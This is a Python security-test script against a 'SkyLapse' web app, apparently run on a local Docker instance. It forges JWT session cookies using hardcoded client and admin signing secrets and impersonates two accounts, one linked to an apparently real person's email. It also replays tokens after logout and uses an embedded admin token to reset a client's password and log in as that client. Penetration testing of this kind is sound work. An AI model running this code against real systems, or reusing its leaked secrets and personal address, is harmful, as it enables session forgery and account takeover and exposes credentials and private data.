#!/usr/bin/env python3
"""
Authentication vulnerability test script for SkyLapse
Tests JWT forgery and token replay vulnerabilities
"""

import hmac
import hashlib
import base64
import json
import time
import urllib.request
import urllib.error

BASE_URL = "http://host.docker.internal:3000"
CLIENT_JWT_SECRET = "RK7hv4GWJ9_fs6LSg6LEBSH_k29c1qFy2DfPjbawbRWsDpJ6kNK3ARHf2xuQgft3_client"
ADMIN_JWT_SECRET = "RK7hv4GWJ9_fs6LSg6LEBSH_k29c1qFy2DfPjbawbRWsDpJ6kNK3ARHf2xuQgft3_admin"

CLIENT_ACCOUNTS = [
    {"id": "51c553f3-cebf-44b6-a231-47196668518a", "email": "idor.test@attacker.com"},
    {"id": "e8bdc214-5f73-4085-9f9f-0e1445765b79", "email": "gustavo@skylineip.com.br"},
]

ADMIN_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbkFjY291bnRJZCI6IjJhMDU2ZGE1LWE0YzktNDhkMy1iOWE4LTI5Nzc0YTU3YzAyMCIsImlhdCI6MTc3NTY1NDc5NiwiZXhwIjoxNzc1NzQxMTk2fQ.ai15InaC-yl1WEyCHXqmMyXCbDVJhv5iJACbtiIchvU"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def forge_jwt(payload: dict, secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode(),
        signing_input.encode(),
        hashlib.sha256
    ).digest()
    sig_b64 = b64url_encode(signature)
    return f"{signing_input}.{sig_b64}"


def http_request(method: str, url: str, headers: dict = None, body: dict = None):
    data = None
    if body is not None:
        data = json.dumps(body).encode()

    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    try:
        with urllib.request.urlopen(req) as resp:
            status = resp.status
            body_raw = resp.read().decode()
            return status, body_raw
    except urllib.error.HTTPError as e:
        status = e.code
        body_raw = e.read().decode()
        return status, body_raw
    except Exception as ex:
        return None, str(ex)


def print_section(title: str):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


def print_step(step: str):
    print(f"\n[STEP] {step}")


def print_result(label: str, status, body: str):
    print(f"  {label}:")
    print(f"    Status: {status}")
    try:
        parsed = json.loads(body)
        print(f"    Body:   {json.dumps(parsed, indent=6)}")
    except Exception:
        print(f"    Body:   {body}")


# ─────────────────────────────────────────────────────────────
# TEST 1: Forge client JWTs and verify against /api/client/me
# ─────────────────────────────────────────────────────────────
print_section("TEST 1: Forge client JWT tokens and verify /api/client/me")

now = int(time.time())
successful_tokens = []

for account in CLIENT_ACCOUNTS:
    print_step(f"Forging token for account {account['id']} ({account['email']})")
    payload = {
        "clientAccountId": account["id"],
        "iat": now,
        "exp": now + 86400,
    }
    token = forge_jwt(payload, CLIENT_JWT_SECRET)
    print(f"  Forged token: {token[:60]}...")

    status, body = http_request(
        "GET",
        f"{BASE_URL}/api/client/me",
        headers={"Cookie": f"skylapse-client-token={token}"},
    )
    print_result("GET /api/client/me", status, body)

    if status == 200:
        print(f"  [VULNERABLE] Token accepted for account {account['id']}")
        successful_tokens.append({"account": account, "token": token})
    else:
        print(f"  [NOT ACCEPTED] Status {status}")

# ─────────────────────────────────────────────────────────────
# TEST 2: Client logout + replay (AUTH-VULN-01 for client)
# ─────────────────────────────────────────────────────────────
print_section("TEST 2: Client logout + token replay (AUTH-VULN-01)")

if not successful_tokens:
    print("  Skipping TEST 2 — no successful tokens from TEST 1.")
else:
    for entry in successful_tokens:
        account = entry["account"]
        token = entry["token"]

        print_step(f"Testing logout+replay for account {account['id']} ({account['email']})")

        # Verify token works before logout
        status_pre, body_pre = http_request(
            "GET",
            f"{BASE_URL}/api/client/me",
            headers={"Cookie": f"skylapse-client-token={token}"},
        )
        print_result("Before logout - GET /api/client/me", status_pre, body_pre)

        # Logout
        status_logout, body_logout = http_request(
            "POST",
            f"{BASE_URL}/api/client/logout",
            headers={"Cookie": f"skylapse-client-token={token}"},
        )
        print_result("POST /api/client/logout", status_logout, body_logout)

        # Replay token after logout
        status_post, body_post = http_request(
            "GET",
            f"{BASE_URL}/api/client/me",
            headers={"Cookie": f"skylapse-client-token={token}"},
        )
        print_result("After logout - GET /api/client/me (replay)", status_post, body_post)

        if status_post == 200:
            print("  [VULNERABLE] Token still works after logout! Token replay confirmed.")
        else:
            print(f"  [MITIGATED] Token rejected after logout (status {status_post}).")

# ─────────────────────────────────────────────────────────────
# TEST 3: Admin API — reset client password, then login
# ─────────────────────────────────────────────────────────────
print_section("TEST 3: Admin API password reset + client login")

target_id = "51c553f3-cebf-44b6-a231-47196668518a"
target_email = "idor.test@attacker.com"
new_password = "TestPassword123"

print_step(f"PUT /api/admin/client-accounts/{target_id} to set password")
status_reset, body_reset = http_request(
    "PUT",
    f"{BASE_URL}/api/admin/client-accounts/{target_id}",
    headers={"Cookie": f"skylapse-admin-token={ADMIN_TOKEN}"},
    body={"senha": new_password},
)
print_result("PUT /api/admin/client-accounts/<id>", status_reset, body_reset)

print_step(f"POST /api/client/login with {target_email} / {new_password}")
status_login, body_login = http_request(
    "POST",
    f"{BASE_URL}/api/client/login",
    body={"email": target_email, "senha": new_password},
)
print_result("POST /api/client/login", status_login, body_login)

if status_login == 200:
    print("  [VULNERABLE] Login succeeded after admin-forced password reset!")
else:
    print(f"  [NOT SUCCESSFUL] Login status: {status_login}")

print("\n" + "=" * 60)
print("  Tests complete.")
print("=" * 60)
